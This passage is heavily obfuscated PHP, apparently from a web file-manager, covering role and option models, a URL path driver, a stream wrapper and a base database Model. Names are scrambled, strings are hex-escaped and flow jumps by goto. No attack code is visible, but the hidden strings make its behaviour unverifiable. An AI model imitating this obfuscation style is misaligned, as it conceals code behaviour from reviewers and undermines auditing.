$Êì–Œô[88] : $Êì–Œô[198]; } elseif (is_null($ğÖí’â)) { $ğÖí’â = $Êì–Œô[103]; } return $ğÖí’â; } public function getLastInsertId() { $›½·ŠèÂ =& $_SERVER[Ó¡Ÿ§‚]; switch ($this->dbType) { case $›½·ŠèÂ[943]: case $›½·ŠèÂ[935]: case $›½·ŠèÂ[916]: case $›½·ŠèÂ[934]: case $›½·ŠèÂ[918]: case $›½·ŠèÂ[946]: return $this->_linkID->lastInsertId(); case $›½·ŠèÂ[917]: case $›½·ŠèÂ[919]: $•¢‹‰ïš = $this->table; $àéÜ™›ë = $this->query("\x53\105\x4c\105\x43\x54\x20{$•¢‹‰ïš}\56\143\165\x72\162\x76\x61\154\x20\x63\x75\x72\162\x76\x61\x6c\x20\106\x52\117\115\40\x64\x75\141\x6c"); return $àéÜ™›ë ? $àéÜ™›ë[0][$›½·ŠèÂ[958]] : 0; } } } goto B§Ûêöšõ; bï‚Ï†÷°Ì: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\154\x65", "\x72\x6f\154\145\x47\162\x6f\x75\x70", "\162\x65\147\151\x73\x74", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($îºÒşÈ) { return "\x53\x79\163\164\x65\x6d\x4f\160\x74\151\157\156\x5f{$îºÒşÈ}"; } protected function optionDefault($Ü¸ÓêÆ = '') { $½ò‚ÒÒ =& $_SERVER[Ó¡Ÿ§‚]; if ($Ü¸ÓêÆ == $½ò‚ÒÒ[12]) { return $GLOBALS[$½ò‚ÒÒ[6]][$½ò‚ÒÒ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x72\157\154\x65\114\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x61\x75\x74\x68", "\154\x61\x62\145\x6c", "\x64\151\x73\x70\x6c\x61\x79", "\163\171\x73\x74\x65\x6d", "\144\x65\x73\x63", "\151\147\x6e\157\x72\x65\105\170\164", "\151\147\156\x6f\162\x65\x46\151\x6c\x65\123\151\172\x65", "\x61\x64\x6d\x69\x6e\151\163\164\x72\141\x74\157\162", "\x73\x6f\x72\164"); public function listData($Âï’Ë‰‘ = false, $Ãé±¤¯• = "\x73\157\162\164", $¦±åŸæ† = false) { $ø÷™µ­ß =& $_SERVER[Ó¡Ÿ§‚]; $˜€øŞˆä = parent::listData($Âï’Ë‰‘, $Ãé±¤¯•, $¦±åŸæ†); if (!$Âï’Ë‰‘) { foreach ($˜€øŞˆä as $«¬Àİ§ => $·×ÈçÒ†) { if ($·×ÈçÒ†[$ø÷™µ­ß[2056]] == 1) { $˜€øŞˆä[$«¬Àİ§][$ø÷™µ­ß[462]] = LNG($ø÷™µ­ß[2290]); } } } return $˜€øŞˆä; } public function update($íÓùìËÛ, $×Óè©ÏÎ) { $¶ÊµõøÎ =& $_SERVER[Ó¡Ÿ§‚]; $ğßÖ¯£‘ = parent::listData($íÓùìËÛ); $“Ğ‰Ä»Š = $this->findByName($×Óè©ÏÎ[$¶ÊµõøÎ[32]]); if (!$ğßÖ¯£‘ || $“Ğ‰Ä»Š && $“Ğ‰Ä»Š[$¶ÊµõøÎ[399]] != $ğßÖ¯£‘[$¶ÊµõøÎ[399]]) { return !1; } if ($“Ğ‰Ä»Š[$¶ÊµõøÎ[2056]] == 1) { $×Óè©ÏÎ = array($¶ÊµõøÎ[32] => $×Óè©ÏÎ[$¶ÊµõøÎ[32]], $¶ÊµõøÎ[1877] => $×Óè©ÏÎ[$¶ÊµõøÎ[1877]]); } $this->filterAuth($×Óè©ÏÎ[$¶ÊµõøÎ[422]]); return parent::update($íÓùìËÛ, $×Óè©ÏÎ); } public function remove($¦ò‹“ÆÌ) { $ïÔÕ§›ğ = parent::listData($¦ò‹“ÆÌ); if (!$ïÔÕ§›ğ || $ïÔÕ§›ğ[$_SERVER[Ó¡Ÿ§‚][1283]]) { return !1; } return parent::remove($¦ò‹“ÆÌ); } public function add($ŠŒ©Ùİ) { $ëİŞìı– =& $_SERVER[Ó¡Ÿ§‚]; $§¤Ê…ßò = $ŠŒ©Ùİ[$ëİŞìı–[32]]; if ($this->findByName($§¤Ê…ßò)) { return !1; } $†ªİšŠ = array($ëİŞìı–[429] => $§¤Ê…ßò, $ëİŞìı–[1860] => $ëİŞìı–[12], $ëİŞìı–[1856] => $ëİŞìı–[1864], $ëİŞìı–[2291] => 1, $ëİŞìı–[1859] => 0, $ëİŞìı–[2292] => 0, $ëİŞìı–[1858] => $this->getSort()); $ŠŒ©Ùİ = array_merge($†ªİšŠ, $ŠŒ©Ùİ); $this->filterAuth($ŠŒ©Ùİ[$ëİŞìı–[422]]); return parent::insert($ŠŒ©Ùİ); } private function getSort() { $©ÆÏˆØ‘ =& $_SERVER[Ó¡Ÿ§‚]; $ß£—¦²Å = parent::listData(); $ƒæ†Ê·ì = array_to_keyvalue($ß£—¦²Å, $©ÆÏˆØ‘[12], $©ÆÏˆØ‘[1878]); return empty($ƒæ†Ê·ì) ? 0 : max($ƒæ†Ê·ì) + 1; } private function filterAuth(&$ş¬ÏÇœ) { $¿ „÷£ =& $_SERVER[Ó¡Ÿ§‚]; $ı€éà¬ï = array(); $‡ÌîÈø = array_filter(explode($¿ „÷£[50], $ş¬ÏÇœ)); foreach ($‡ÌîÈø as $ş¬ÏÇœ) { $›š¹·®¬ = explode($¿ „÷£[10], $ş¬ÏÇœ); if ($›š¹·®¬[0] == $¿ „÷£[2293] && $›š¹·®¬[1] != $¿ „÷£[1189]) { $ñ†Àƒá‰ = $›š¹·®¬[0] . $¿ „÷£[10] . $›š¹·®¬[1] . $¿ „÷£[2294]; if (!in_array($ñ†Àƒá‰, $‡ÌîÈø)) { $ı€éà¬ï[] = $ñ†Àƒá‰; } } $ı€éà¬ï[] = $ş¬ÏÇœ; } $ş¬ÏÇœ = implode($¿ „÷£[50], $ı€éà¬ï); } public function findRoleDefault() { $ª×Šİ¥ş =& $_SERVER[Ó¡Ÿ§‚]; $ç¿İ³ ¥ = parent::listData(); $èÓ™ŸÉê = !1; foreach ($ç¿İ³ ¥ as $‹æÓü‚) { if (!$‹æÓü‚ || $‹æÓü‚[$ª×Šİ¥ş[1876]] == $ª×Šİ¥ş[198] || $‹æÓü‚[$ª×Šİ¥ş[2056]] == 1) { continue; } if (strstr($‹æÓü‚[$ª×Šİ¥ş[422]], $ª×Šİ¥ş[2295])) { continue; } if (!strstr($‹æÓü‚[$ª×Šİ¥ş[422]], $ª×Šİ¥ş[2296])) { continue; } if (!$èÓ™ŸÉê) { $èÓ™ŸÉê = $‹æÓü‚; continue; } $ îùöêà = explode($ª×Šİ¥ş[50], $èÓ™ŸÉê[$ª×Šİ¥ş[422]]); $¸‘Í™‰Ÿ = explode($ª×Šİ¥ş[50], $‹æÓü‚[$ª×Šİ¥ş[422]]); if (count($ îùöêà) > count($¸‘Í™‰Ÿ)) { $èÓ™ŸÉê = $‹æÓü‚; } } return $èÓ™ŸÉê ? $èÓ™ŸÉê[$ª×Šİ¥ş[399]] : $ª×Šİ¥ş[12]; } public function sort($Ú“‚ş½Ü, $†ŠõÙ†) { return parent::update($Ú“‚ş½Ü, $†ŠõÙ†); } } goto eƒ÷¿‡ì†‘; A®Šä®ªßò: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¤Œ§£¦ = false) { } public function exist($ğ¢ºÆ»õ) { $ü°üĞ´Ù = $this->info($ğ¢ºÆ»õ); return $ü°üĞ´Ù[$_SERVER[Ó¡Ÿ§‚][202]]; } public function isFile($µ›óÛ’·) { $‚ßœ¸« = $this->info($µ›óÛ’·); return $‚ßœ¸«[$_SERVER[Ó¡Ÿ§‚][202]]; } public function isFolder($šÙßäîü) { return !1; } public function size($ëÍ…Ï²) { $Ñãáù‹Š = $this->info($ëÍ…Ï²); return $Ñãáù‹Š[$_SERVER[Ó¡Ÿ§‚][76]]; } public function info($È˜½Ñ‚Ê) { return $this->infoParse($È˜½Ñ‚Ê); } public function infoAuth($óõŞÇ¯¸) { return $this->infoParse($óõŞÇ¯¸); } public function infoWithChildren($ëÒâí‡) { return $this->infoParse($ëÒâí‡); } public function infoFull($¾“×‹Í) { return $this->infoParse($¾“×‹Í); } private function infoParse($”õÃ™š) { $Óúâïß =& $_SERVER[Ó¡Ÿ§‚]; $Šš±¨à— = $this->header($”õÃ™š); if (!$Šš±¨à— || !$Šš±¨à—[$Óúâïß[748]]) { return !1; } $ñš¦”Ü» = _get($Šš±¨à—, $Óúâïß[337], 0); $£á£¢— = array($Óúâïß[32] => $Šš±¨à—[$Óúâïß[32]], $Óúâïß[84] => $”õÃ™š, $Óúâïß[33] => $Óúâïß[200], $Óúâïß[76] => intval($ñš¦”Ü»), $Óúâïß[174] => get_path_ext($Šš±¨à—[$Óúâïß[32]]), $Óúâïß[1389] => $ñš¦”Ü» > 0 && $Šš±¨à—[$Óúâïß[1511]], $Óúâïß[1390] => !1); return $£á£¢—; } private function header($ˆªÛ±Óó) { $±¡Ë­Ô™ =& $_SERVER[Ó¡Ÿ§‚]; if (isset(self::$_cacheHeader[$ˆªÛ±Óó])) { return self::$_cacheHeader[$ˆªÛ±Óó]; } $„ÀâáËõ = isset($GLOBALS[$±¡Ë­Ô™[1512]]) ? $GLOBALS[$±¡Ë­Ô™[1512]] : !1; $GLOBALS[$±¡Ë­Ô™[1512]] = !0; self::$_cacheHeader[$ˆªÛ±Óó] = url_header($ˆªÛ±Óó); $GLOBALS[$±¡Ë­Ô™[1512]] = $„ÀâáËõ; return self::$_cacheHeader[$ˆªÛ±Óó]; } public function hashSimple($Ò€Ò´“ú, $€©Ä†è¶ = false) { $—¦Äš³Ò =& $_SERVER[Ó¡Ÿ§‚]; $Ó‡ôÍï = $this->info($Ò€Ò´“ú); if (!$Ó‡ôÍï || !$Ó‡ôÍï[$—¦Äš³Ò[202]]) { return !1; } $í€¸„Áó = $Ó‡ôÍï[$—¦Äš³Ò[76]]; $Şö¥«¢ = 200; $…ôÜ™É = 50; if ($í€¸„Áó <= $Şö¥«¢ * $…ôÜ™É) { return md5($this->fileSubstr($Ò€Ò´“ú, 0, $í€¸„Áó)) . $í€¸„Áó; } $¾Õó½…ú = intval($í€¸„Áó / $…ôÜ™É); $¿ÈëÀ©‘ = $—¦Äš³Ò[12]; $œØ¿¸É = timeFloat(); $ÌèÕ•Îé = 15; for ($è˜Ş½ = 0; $è˜Ş½ < $…ôÜ™É; $è˜Ş½++) { if (timeFloat() - $œØ¿¸É > $ÌèÕ•Îé) { return !1; } $Õß† = $this->fileSubstr($Ò€Ò´“ú, $¾Õó½…ú * $è˜Ş½, $Şö¥«¢); if (!$Õß†) { return !1; } $¿ÈëÀ©‘ .= $Õß†; } $¿ÈëÀ©‘ .= $this->fileSubstr($Ò€Ò´“ú, $í€¸„Áó - $Şö¥«¢, $Şö¥«¢); return md5($¿ÈëÀ©‘) . $í€¸„Áó; } public function getContent($†åÅâ£) { return $this->fileSubstr($†åÅâ£); } public function fileSubstr($‘”†€«, $¯Ë¹Ä°Ğ = 0, $ùí×À©™ = -1) { $À—º«÷ä =& $_SERVER[Ó¡Ÿ§‚]; $ÙöÔ¹ = $this->info($‘”†€«); if (!$ÙöÔ¹ || !$ÙöÔ¹[$À—º«÷ä[202]] && $ÙöÔ¹[$À—º«÷ä[76]] > 1024 * 1024 * 10) { return !1; } if ($ùí×À©™ === -1) { $ùí×À©™ = $ÙöÔ¹[$À—º«÷ä[76]]; } if ($ùí×À©™ == 0) { return $À—º«÷ä[12]; } $›ş‰ˆÈ¹ = array($À—º«÷ä[1513] . $¯Ë¹Ä°Ğ . $À—º«÷ä[781] . ($¯Ë¹Ä°Ğ + $ùí×À©™ - 1)); $‚œáıš™ = url_request($‘”†€«, $À—º«÷ä[230], !1, $›ş‰ˆÈ¹, !1, !1, 30); return $‚œáıš™[$À—º«÷ä[1201]] ? $‚œáıš™[$À—º«÷ä[1201]] : $À—º«÷ä[12]; } public function download($¹ááÇæ™, $¨Øâ¡ù) { Downloader::start($¹ááÇæ™, $¨Øâ¡ù); return $¨Øâ¡ù; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ïÉÓØ¡», $ÅÌ²ÅµÒ = '') { $this->info = $this->info($ïÉÓØ¡»); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ó¡Ÿ§‚][84]]; $this->pathOpen = $ïÉÓØ¡»; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ïÉÓØ¡»])) { self::$_chunkBuffer[$ïÉÓØ¡»] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ıòŠŠÍù) { $û°‡õ¢Ú = $this->fileSubstr($this->pose, $ıòŠŠÍù); $this->pose += strlen($û°‡õ¢Ú); return $û°‡õ¢Ú; } public function stream_tell() { return $this->pose; } public function stream_seek($‰ã±¦†Ú, $õô»ù¹â) { $ü¾ „±› =& $_SERVER[Ó¡Ÿ§‚]; if ($õô»ù¹â == SEEK_SET) { $this->pose = $‰ã±¦†Ú; } else { if ($õô»ù¹â == SEEK_CUR) { $this->pose += $‰ã±¦†Ú; } else { if ($õô»ù¹â == SEEK_END) { $this->pose = $this->info[$ü¾ „±›[76]] + intval($‰ã±¦†Ú); } } } if ($‰ã±¦†Ú < 0) { $this->pose = $this->info[$ü¾ „±›[76]] + $‰ã±¦†Ú; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ó¡Ÿ§‚][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÈâÌ®¤Ë, $Ô¶»¿ÁÔ) { $Â¼›Í÷º =& $_SERVER[Ó¡Ÿ§‚]; $úî½õ¢© = $this->info($ÈâÌ®¤Ë); return array($Â¼›Í÷º[1514] => 0, $Â¼›Í÷º[1515] => 0, $Â¼›Í÷º[16] => 32768 + 511, $Â¼›Í÷º[1516] => 0, $Â¼›Í÷º[1517] => 0, $Â¼›Í÷º[1518] => 0, $Â¼›Í÷º[1519] => 0, $Â¼›Í÷º[76] => $úî½õ¢©[$Â¼›Í÷º[76]], $Â¼›Í÷º[1520] => $úî½õ¢©[$Â¼›Í÷º[1388]], $Â¼›Í÷º[1476] => $úî½õ¢©[$Â¼›Í÷º[85]], $Â¼›Í÷º[1475] => $úî½õ¢©[$Â¼›Í÷º[201]], $Â¼›Í÷º[1521] => 0, $Â¼›Í÷º[1522] => 0); } static $fileInfo = array(); public function info($ûÅ¯†Ş) { $¶­‰Œ† = $_SERVER[Ó¡Ÿ§‚][1523]; if (isset(self::$fileInfo[$ûÅ¯†Ş])) { return self::$fileInfo[$ûÅ¯†Ş]; } if (substr($ûÅ¯†Ş, 0, strlen($¶­‰Œ†)) != $¶­‰Œ†) { return !1; } self::$fileInfo[$ûÅ¯†Ş] = IO::info(substr($ûÅ¯†Ş, strlen($¶­‰Œ†))); return self::$fileInfo[$ûÅ¯†Ş]; } public static function read($úò˜™Ü, $¢’±©Õ, $é™óëÖÕ) { if (!isset(self::$_fopenCache[$úò˜™Ü])) { $’Œ¤¸ëµ = new StreamWrapperIO(); $’Œ¤¸ëµ->stream_open($úò˜™Ü); self::$_fopenCache[$úò˜™Ü] = $’Œ¤¸ëµ; } $’Œ¤¸ëµ = self::$_fopenCache[$úò˜™Ü]; return $’Œ¤¸ëµ->fileSubstr($¢’±©Õ, $é™óëÖÕ); } public static function _read($Ûí¿¬˜, $Û‘çÖ¢±, $À¸“‚Ø) { $‹¸áª‡Ò =& $_SERVER[Ó¡Ÿ§‚]; $ûåúÑ = fopen($Ûí¿¬˜, $‹¸áª‡Ò[1392]); if (!$ûåúÑ) { return $‹¸áª‡Ò[12]; } $ĞÎõ€Ô¢ = 8192; fseek($ûåúÑ, $Û‘çÖ¢±, SEEK_SET); $£®®Â•‡ = $‹¸áª‡Ò[12]; $×ìˆœ„ = 0; while ($×ìˆœ„ < $À¸“‚Ø) { $ı•†™—à = min($ĞÎõ€Ô¢, $À¸“‚Ø - $×ìˆœ„); $£®®Â•‡ .= fread($ûåúÑ, $ı•†™—à); $×ìˆœ„ += $ı•†™—à; } fclose($ûåúÑ); return $£®®Â•‡; } public function fileSubstr($¾êà­ü, $ë¼ıê·ø) { $·öâŸŞÜ =& $_SERVER[Ó¡Ÿ§‚]; $—»Š¿Óš = $this->info[$·öâŸŞÜ[76]]; $ä‰Õ¢Éï = $¾êà­ü; $ˆæÇø¼‰ = $ë¼ıê·ø; if ($¾êà­ü < 0) { $¾êà­ü = $—»Š¿Óš + $¾êà­ü; } if ($ë¼ıê·ø === !1) { $ë¼ıê·ø = $—»Š¿Óš - $¾êà­ü; } if ($¾êà­ü + $ë¼ıê·ø > $—»Š¿Óš) { $ë¼ıê·ø = $—»Š¿Óš - $¾êà­ü; } if ($ë¼ıê·ø <= 0) { return $·öâŸŞÜ[12]; } if ($¾êà­ü < 0 || $¾êà­ü >= $—»Š¿Óš || $ë¼ıê·ø <= 0 || $ë¼ıê·ø > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\145\x52\x65\141\x64\40\145\162\x72\x6f\162\x21\40\x73\164\x61\162\164\x3d{$¾êà­ü}\x3b\154\145\156\x67\164\x68\75{$ë¼ıê·ø}\x3b\40\x73\x69\172\145\x3d{$—»Š¿Óš}\73"); } $‹ƒğá¼ = 64 * 1024; $¯›ææäÀ =& self::$_chunkBuffer[$this->path]; if (!$¯›ææäÀ) { $¯›ææäÀ = array(); } $•ôÇ­•û = 0; $®÷±ï÷ = 0; $ç™Á˜Íæ = $·öâŸŞÜ[12]; foreach ($¯›ææäÀ as $•ôÇ­•û => $ç™Á˜Íæ) { $•ôÇ­•û = intval($•ôÇ­•û); $®÷±ï÷ = $•ôÇ­•û + strlen($ç™Á˜Íæ); if ($¾êà­ü >= $®÷±ï÷) { continue; } if ($¾êà­ü >= $•ôÇ­•û && $¾êà­ü + $ë¼ıê·ø <= $®÷±ï÷) { return substr($ç™Á˜Íæ, $¾êà­ü - $•ôÇ­•û, $ë¼ıê·ø); } break; } if (count($¯›ææäÀ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($·öâŸŞÜ[1524], $·öâŸŞÜ[1525] . count($¯›ææäÀ) . "\73\163\164\x61\x72\164\75{$¾êà­ü}\54\154\145\x6e\x67\x74\150\75{$ë¼ıê·ø}\x3b\160\x6f\163\x65\72{$•ôÇ­•û}\176{$®÷±ï÷}"); throw new Exception($·öâŸŞÜ[1526]); } $Å›½£‡ = intval($¾êà­ü / $‹ƒğá¼) * $‹ƒğá¼; $¯×ÙÔû = ceil(($¾êà­ü + $ë¼ıê·ø) / $‹ƒğá¼) * $‹ƒğá¼ - $Å›½£‡; $ÏšàËŸˆ = IO::fileSubstr($this->path, $Å›½£‡, $¯×ÙÔû); $¯›ææäÀ[$Å›½£‡ . $·öâŸŞÜ[12]] = $ÏšàËŸˆ; ksort($¯›ææäÀ); $¨Êª€²ê = substr($ÏšàËŸˆ, $¾êà­ü - $Å›½£‡, $ë¼ıê·ø); return $¨Êª€²ê; } private function log($é·ÄÉŞ, $­úµ…ÜÂ) { $£õĞ´¹ö =& $_SERVER[Ó¡Ÿ§‚]; $´Š©‚Î = timeFloat() - $this->timeStart; write_log(sprintf($£õĞ´¹ö[1527], $é·ÄÉŞ, $this->info[$£õĞ´¹ö[32]], $´Š©‚Î, $­úµ…ÜÂ), $£õĞ´¹ö[1181]); } } class Message { function __construct() { } public function send($”æ™âˆ‘ = '', $ƒò€È = array(), $ÕƒìÊØ = "\x74\x65\170\164") { $×ü­”Ã =& $_SERVER[Ó¡Ÿ§‚]; $¨Ô ü = array($×ü­”Ã[33] => $×ü­”Ã[1528], $×ü­”Ã[753] => $”æ™âˆ‘); if (in_array($ÕƒìÊØ, array($×ü­”Ã[1528], $×ü­”Ã[1529]))) { $¨Ô ü[$×ü­”Ã[33]] = $ÕƒìÊØ; } $ƒò€È = array($×ü­”Ã[514] => isset($ƒò€È[$×ü­”Ã[514]]) ? $ƒò€È[$×ü­”Ã[514]] : $×ü­”Ã[12], $×ü­”Ã[599] => isset($ƒò€È[$×ü­”Ã[599]]) ? $ƒò€È[$×ü­”Ã[599]] : $×ü­”Ã[12]); if (empty($”æ™âˆ‘) || empty($ƒò€È[$×ü­”Ã[514]]) && empty($ƒò€È[$×ü­”Ã[599]])) { return !1; } $äõôŞ—‚ = array($×ü­”Ã[1469] => $¨Ô ü, $×ü­”Ã[1530] => $ƒò€È); Hook::trigger($×ü­”Ã[1531], $äõôŞ—‚); } } goto cß•†Èäê“; F½íŒïÚó¡: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\x65", "\157\162\x64\x65\162", "\x61\154\x69\141\x73", "\150\141\x76\x69\x6e\147", "\x67\162\x6f\165\160", "\x6c\x6f\x63\x6b", "\x64\x69\163\x74\151\x6e\143\164", "\x61\165\164\x6f", "\146\x69\x6c\x74\x65\162", "\x76\x61\x6c\x69\144\141\164\x65", "\x72\145\163\165\154\164", "\142\x69\156\144", "\164\x6f\x6b\x65\x6e"); public function __construct($ŸÔ¯û™™ = '', $İ½éåÅ‰ = '', $áÄÈÙ¯† = '') { $”ÜâĞı¦ =& $_SERVER[Ó¡Ÿ§‚]; $this->_initialize(); if (!empty($ŸÔ¯û™™)) { if (strpos($ŸÔ¯û™™, $”ÜâĞı¦[10])) { list($this->dbName, $this->name) = explode($”ÜâĞı¦[10], $ŸÔ¯û™™); } else { $this->name = $ŸÔ¯û™™; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($İ½éåÅ‰)) { $this->tablePrefix = $”ÜâĞı¦[12]; } elseif ($”ÜâĞı¦[12] != $İ½éåÅ‰) { $this->tablePrefix = $İ½éåÅ‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”ÜâĞı¦[244]); } $this->db(0, empty($this->connection) ? $áÄÈÙ¯† : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ó·±ø¬ª =& $_SERVER[Ó¡Ÿ§‚]; if (empty($this->fields)) { if (think_config($Ó·±ø¬ª[245])) { $ÁßÖş = $this->dbName ? $this->dbName : think_config($Ó·±ø¬ª[246]); $š†–¤ˆˆ = think_var_cache($Ó·±ø¬ª[247] . strtolower(get_path_this($ÁßÖş) . $Ó·±ø¬ª[10] . $this->name)); if ($š†–¤ˆˆ) { $¿ÜëŞ£Œ = think_config($Ó·±ø¬ª[248]); if (empty($¿ÜëŞ£Œ) || $š†–¤ˆˆ[$Ó·±ø¬ª[249]] == $¿ÜëŞ£Œ) { $this->fields = $š†–¤ˆˆ; return; } } } $this->flush(); } } public function flush() { $Ó×™ÎÈ– =& $_SERVER[Ó¡Ÿ§‚]; $this->db->setModel($this->name); $æò›Ñş = $this->db->getFields($this->getTableName()); if (!$æò›Ñş) { return !1; } $this->fields = array_keys($æò›Ñş); $this->fields[$Ó×™ÎÈ–[250]] = !1; foreach ($æò›Ñş as $åï´‰Óè => $±æ±ò±’) { $»¿…øÆñ[$åï´‰Óè] = $±æ±ò±’[$Ó×™ÎÈ–[33]]; if ($±æ±ò±’[$Ó×™ÎÈ–[39]]) { $this->fields[$Ó×™ÎÈ–[251]] = $åï´‰Óè; if ($±æ±ò±’[$Ó×™ÎÈ–[42]]) { $this->fields[$Ó×™ÎÈ–[250]] = !0; } } } $this->fields[$Ó×™ÎÈ–[252]] = $»¿…øÆñ; if (think_config($Ó×™ÎÈ–[248])) { $this->fields[$Ó×™ÎÈ–[249]] = think_config($Ó×™ÎÈ–[248]); } if (think_config($Ó×™ÎÈ–[245])) { $Í›çê¸Û = $this->dbName ? $this->dbName : think_config($Ó×™ÎÈ–[246]); think_var_cache($Ó×™ÎÈ–[247] . strtolower(get_path_this($Í›çê¸Û) . $Ó×™ÎÈ–[10] . $this->name), $this->fields); } } public function switchModel($»ÏĞ ı, $­¤šôğó = array()) { $Ú¦Á½ĞÉ =& $_SERVER[Ó¡Ÿ§‚]; $Äú˜äÓÅ = ucwords(strtolower($»ÏĞ ı)) . $Ú¦Á½ĞÉ[253]; if (!class_exists($Äú˜äÓÅ)) { think_exception($Äú˜äÓÅ . think_lang($Ú¦Á½ĞÉ[254])); } $this->_extModel = new $Äú˜äÓÅ($this->name); if (!empty($­¤šôğó)) { foreach ($­¤šôğó as $Ç²øÈ×÷) { $this->_extModel->setProperty($Ç²øÈ×÷, $this->{$Ç²øÈ×÷}); } } return $this->_extModel; } public function __set($†—‘šŠ–, $³ ¢¨ÏÁ) { $this->data[$†—‘šŠ–] = $³ ¢¨ÏÁ; } public function __get($Ô²ÓÑœî) { return isset($this->data[$Ô²ÓÑœî]) ? $this->data[$Ô²ÓÑœî] : null; } public function __isset($”¡¬ß±) { return isset($this->data[$”¡¬ß±]); } public function __unset($¨™˜–äñ) { unset($this->data[$¨™˜–äñ]); } public function __call($ıåê³ª, $œşµëŒØ) { $¿§çê—‹ =& $_SERVER[Ó¡Ÿ§‚]; if (in_array(strtolower($ıåê³ª), $this->methods, !0)) { $this->options[strtolower($ıåê³ª)] = $œşµëŒØ[0]; return $this; } elseif (in_array(strtolower($ıåê³ª), array($¿§çê—‹[255], $¿§çê—‹[256], $¿§çê—‹[257], $¿§çê—‹[258], $¿§çê—‹[259]), !0)) { $øÃ¥Õ¬ = isset($œşµëŒØ[0]) ? $œşµëŒØ[0] : $¿§çê—‹[189]; $øÃ¥Õ¬ = $this->db->parseKey($øÃ¥Õ¬); return $this->getField(strtoupper($ıåê³ª) . $¿§çê—‹[260] . $øÃ¥Õ¬ . $¿§çê—‹[261] . $ıåê³ª, $¿§çê—‹[255]); } elseif (strtolower(substr($ıåê³ª, 0, 5)) == $¿§çê—‹[262]) { $øÃ¥Õ¬ = think_parse_name(substr($ıåê³ª, 5)); $Ò”¬ŞÅÆ[$øÃ¥Õ¬] = $œşµëŒØ[0]; return $this->where($Ò”¬ŞÅÆ)->find(); } elseif (strtolower(substr($ıåê³ª, 0, 10)) == $¿§çê—‹[263]) { $º ´í»ç = think_parse_name(substr($ıåê³ª, 10)); $Ò”¬ŞÅÆ[$º ´í»ç] = $œşµëŒØ[0]; return $this->where($Ò”¬ŞÅÆ)->getField($œşµëŒØ[1]); } elseif (isset($this->_scope[$ıåê³ª])) { return $this->scope($ıåê³ª, $œşµëŒØ[0]); } elseif (method_exists($this, $ıåê³ª)) { array_unshift($œşµëŒØ, $ıåê³ª); return call_user_func_array(array($this, $¿§çê—‹[264]), $œşµëŒØ); } else { return call_user_func_array(array(parent, $ıåê³ª), $œşµëŒØ); } } protected function call() { $’ˆ½±ñş =& $_SERVER[Ó¡Ÿ§‚]; $Æäö›ıè = func_get_args(); $³Ÿ±Š = array_shift($Æäö›ıè); $½µûŠÛ¼ = $³Ÿ±Š; if (is_array($³Ÿ±Š)) { $½µûŠÛ¼ = $³Ÿ±Š[1]; $³Ÿ±Š = $³Ÿ±Š[0]; } $”ƒÃÚÉò = count($Æäö›ıè) - 1; if (isset($Æäö›ıè[$”ƒÃÚÉò]) && $Æäö›ıè[$”ƒÃÚÉò] === $³Ÿ±Š) { think_exception(__CLASS__ . $’ˆ½±ñş[4] . $³Ÿ±Š . think_lang($’ˆ½±ñş[265])); return; } $Æäö›ıè[] = $³Ÿ±Š; if (method_exists($this, $’ˆ½±ñş[266])) { $‰åçËòÖ = call_user_func_array(array($this, $’ˆ½±ñş[267]), array($½µûŠÛ¼, $Æäö›ıè)); if (!is_null($‰åçËòÖ) && $‰åçËòÖ !== !1) { return $‰åçËòÖ; } } $İ¥£Æ‚æ = call_user_func_array(array($this, $³Ÿ±Š), $Æäö›ıè); if (method_exists($this, $’ˆ½±ñş[268])) { $‰åçËòÖ = call_user_func_array(array($this, $’ˆ½±ñş[269]), array($½µûŠÛ¼, $Æäö›ıè, $İ¥£Æ‚æ)); if ($‰åçËòÖ) { return $‰åçËòÖ; } } return $İ¥£Æ‚æ; } protected function _initialize() { } protected function _facade($úô‘) { $Òñ”Åçé =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($this->fields)) { foreach ($úô‘ as $âÑ‘¾úÊ => $Ë™çäì) { if (is_array($this->fields) && !in_array($âÑ‘¾úÊ, $this->fields, !0)) { unset($úô‘[$âÑ‘¾úÊ]); } elseif (is_scalar($Ë™çäì)) { $this->_parseType($úô‘, $âÑ‘¾úÊ); } } } if (!empty($this->options[$Òñ”Åçé[270]])) { $úô‘ = array_map($this->options[$Òñ”Åçé[270]], $úô‘); unset($this->options[$Òñ”Åçé[270]]); } $this->_beforeWrite($úô‘); return $úô‘; } protected function _beforeWrite(&$‹œ‚»•â) { } public function add($«Ãºä— = '', $ÜŒïãô = array(), $Ÿòë¯À = false) { if (empty($«Ãºä—)) { if (!empty($this->data)) { $«Ãºä— = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ó¡Ÿ§‚][271]); return !1; } } $ÜŒïãô = $this->_parseOptions($ÜŒïãô); $«Ãºä— = 